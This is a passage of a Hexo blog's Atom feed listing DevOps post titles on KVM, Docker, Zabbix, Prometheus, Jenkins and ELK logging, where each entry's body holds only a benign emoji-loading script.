<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Deops&#39;s blog</title>
  
  <subtitle>运维开发工程师</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://marnm.github.io/"/>
  <updated>2022-06-07T05:46:04.451Z</updated>
  <id>https://marnm.github.io/</id>
  
  <author>
    <name>Echo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>KVM虚拟机迁移</title>
    <link href="https://marnm.github.io//posts/16305c66/"/>
    <id>https://marnm.github.io//posts/16305c66/</id>
    <published>2022-06-07T05:45:42.000Z</published>
    <updated>2022-06-07T05:46:04.451Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM虚拟机添加磁盘</title>
    <link href="https://marnm.github.io//posts/d69c6e72/"/>
    <id>https://marnm.github.io//posts/d69c6e72/</id>
    <published>2022-06-07T05:45:36.000Z</published>
    <updated>2022-06-07T05:46:04.447Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM虚拟机克隆和快照</title>
    <link href="https://marnm.github.io//posts/204af86b/"/>
    <id>https://marnm.github.io//posts/204af86b/</id>
    <published>2022-06-07T05:45:27.000Z</published>
    <updated>2022-06-07T05:46:04.448Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM图形化</title>
    <link href="https://marnm.github.io//posts/dba5727f/"/>
    <id>https://marnm.github.io//posts/dba5727f/</id>
    <published>2022-06-07T05:45:11.000Z</published>
    <updated>2022-06-07T05:46:04.446Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于Docker搭建Prometheus</title>
    <link href="https://marnm.github.io//posts/e364486e/"/>
    <id>https://marnm.github.io//posts/e364486e/</id>
    <published>2022-06-07T05:44:56.000Z</published>
    <updated>2022-06-07T05:46:04.469Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Prometheus和Grafana结合监控MySQL服务性能</title>
    <link href="https://marnm.github.io//posts/35dff01/"/>
    <id>https://marnm.github.io//posts/35dff01/</id>
    <published>2022-06-07T05:44:48.000Z</published>
    <updated>2022-06-07T05:46:04.459Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Zabbix4.0</title>
    <link href="https://marnm.github.io//posts/7034657d/"/>
    <id>https://marnm.github.io//posts/7034657d/</id>
    <published>2022-06-07T05:44:25.000Z</published>
    <updated>2022-06-07T05:46:04.463Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Zabbix3.4邮件报警配置</title>
    <link href="https://marnm.github.io//posts/59089347/"/>
    <id>https://marnm.github.io//posts/59089347/</id>
    <published>2022-06-07T05:44:11.000Z</published>
    <updated>2022-06-07T05:46:04.462Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>邮件报警配置</title>
    <link href="https://marnm.github.io//posts/undefined/"/>
    <id>https://marnm.github.io//posts/undefined/</id>
    <published>2022-06-07T05:43:47.000Z</published>
    <updated>2022-06-07T05:43:47.769Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置Zabbix3.4监控Apache服务</title>
    <link href="https://marnm.github.io//posts/76011417/"/>
    <id>https://marnm.github.io//posts/76011417/</id>
    <published>2022-06-07T05:43:37.000Z</published>
    <updated>2022-06-07T05:46:04.478Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于LNMP架构搭建企业级开源监控系统Zabbix</title>
    <link href="https://marnm.github.io//posts/69c239dd/"/>
    <id>https://marnm.github.io//posts/69c239dd/</id>
    <published>2022-06-07T05:43:19.000Z</published>
    <updated>2022-06-07T05:46:04.470Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置Docker静态IP</title>
    <link href="https://marnm.github.io//posts/5095a46f/"/>
    <id>https://marnm.github.io//posts/5095a46f/</id>
    <published>2022-06-07T05:43:03.000Z</published>
    <updated>2022-06-07T05:46:04.477Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker容器命名和资源配额控制</title>
    <link href="https://marnm.github.io//posts/5a91d657/"/>
    <id>https://marnm.github.io//posts/5a91d657/</id>
    <published>2022-06-07T05:42:56.000Z</published>
    <updated>2022-06-07T05:46:04.435Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建JumpServer管理王者荣耀数万台游戏服务器</title>
    <link href="https://marnm.github.io//posts/4f96852/"/>
    <id>https://marnm.github.io//posts/4f96852/</id>
    <published>2022-06-07T05:42:33.000Z</published>
    <updated>2022-06-07T05:46:04.475Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Git版本控制</title>
    <link href="https://marnm.github.io//posts/ca9298d7/"/>
    <id>https://marnm.github.io//posts/ca9298d7/</id>
    <published>2022-06-07T05:42:15.000Z</published>
    <updated>2022-06-07T05:46:04.445Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>实战-GitLab更新代码后自动触发Jenkins进行部署</title>
    <link href="https://marnm.github.io//posts/f5d6f6a9/"/>
    <id>https://marnm.github.io//posts/f5d6f6a9/</id>
    <published>2022-06-07T05:41:59.000Z</published>
    <updated>2022-06-07T05:46:04.471Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建Jenkins实现持续集成-配置Jenkins自动拉取GitLab中的代码</title>
    <link href="https://marnm.github.io//posts/8a3c5d26/"/>
    <id>https://marnm.github.io//posts/8a3c5d26/</id>
    <published>2022-06-07T05:41:46.000Z</published>
    <updated>2022-06-07T05:46:04.473Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置GitLab邮件服务</title>
    <link href="https://marnm.github.io//posts/2b923a54/"/>
    <id>https://marnm.github.io//posts/2b923a54/</id>
    <published>2022-06-07T05:41:33.000Z</published>
    <updated>2022-06-07T05:46:04.476Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>增加一台Filebeat收集httpd日志</title>
    <link href="https://marnm.github.io//posts/f801d3c5/"/>
    <id>https://marnm.github.io//posts/f801d3c5/</id>
    <published>2022-06-07T05:40:50.000Z</published>
    <updated>2022-06-07T05:46:04.472Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Filebeat和Logstash间引入Redis</title>
    <link href="https://marnm.github.io//posts/284128ee/"/>
    <id>https://marnm.github.io//posts/284128ee/</id>
    <published>2022-06-07T05:40:38.000Z</published>
    <updated>2022-06-07T05:46:04.444Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis编译安装</title>
    <link href="https://marnm.github.io//posts/41f893fd/"/>
    <id>https://marnm.github.io//posts/41f893fd/</id>
    <published>2022-06-07T05:40:24.000Z</published>
    <updated>2022-06-07T05:46:04.461Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>filebeat采集多个日志</title>
    <link href="https://marnm.github.io//posts/186d367f/"/>
    <id>https://marnm.github.io//posts/186d367f/</id>
    <published>2022-06-07T05:40:04.000Z</published>
    <updated>2022-06-07T05:46:04.466Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>json格式日志采集</title>
    <link href="https://marnm.github.io//posts/dea13731/"/>
    <id>https://marnm.github.io//posts/dea13731/</id>
    <published>2022-06-07T05:39:49.000Z</published>
    <updated>2022-06-07T05:46:04.467Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Filebeat和Logstash架构</title>
    <link href="https://marnm.github.io//posts/23381a3e/"/>
    <id>https://marnm.github.io//posts/23381a3e/</id>
    <published>2022-06-07T05:39:35.000Z</published>
    <updated>2022-06-07T05:46:04.442Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ELK覆盖时间轴和全量分析Nginx</title>
    <link href="https://marnm.github.io//posts/575b5119/"/>
    <id>https://marnm.github.io//posts/575b5119/</id>
    <published>2022-06-07T05:39:16.000Z</published>
    <updated>2022-06-07T05:46:04.440Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Logstash去除不需要的字段</title>
    <link href="https://marnm.github.io//posts/b11339a9/"/>
    <id>https://marnm.github.io//posts/b11339a9/</id>
    <published>2022-06-07T05:38:53.000Z</published>
    <updated>2022-06-07T05:46:04.456Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://marnm.github.io//posts/2f57a694/"/>
    <id>https://marnm.github.io//posts/2f57a694/</id>
    <published>2022-06-07T05:38:42.000Z</published>
    <updated>2022-06-07T05:46:04.477Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Logstash读取日志发送到ES</title>
    <link href="https://marnm.github.io//posts/d05b44e0/"/>
    <id>https://marnm.github.io//posts/d05b44e0/</id>
    <published>2022-06-07T05:38:29.000Z</published>
    <updated>2022-06-07T05:46:04.457Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Logstash二进制安装与启动</title>
    <link href="https://marnm.github.io//posts/573fc171/"/>
    <id>https://marnm.github.io//posts/573fc171/</id>
    <published>2022-06-07T05:38:20.000Z</published>
    <updated>2022-06-07T05:46:04.455Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ELK启动注意事项</title>
    <link href="https://marnm.github.io//posts/ae1082d2/"/>
    <id>https://marnm.github.io//posts/ae1082d2/</id>
    <published>2022-06-07T05:37:54.000Z</published>
    <updated>2022-06-07T05:46:04.439Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ELK借用Nginx实现认证</title>
    <link href="https://marnm.github.io//posts/9615e350/"/>
    <id>https://marnm.github.io//posts/9615e350/</id>
    <published>2022-06-07T05:37:34.000Z</published>
    <updated>2022-06-07T05:46:04.437Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ELK二进制安装与启动</title>
    <link href="https://marnm.github.io//posts/9d4cf15e/"/>
    <id>https://marnm.github.io//posts/9d4cf15e/</id>
    <published>2022-06-07T05:37:19.000Z</published>
    <updated>2022-06-07T05:46:04.438Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ELK学习笔记与搭建</title>
    <link href="https://marnm.github.io//posts/207645b9/"/>
    <id>https://marnm.github.io//posts/207645b9/</id>
    <published>2022-06-07T05:37:07.000Z</published>
    <updated>2022-06-07T05:46:04.443Z</updated>
    
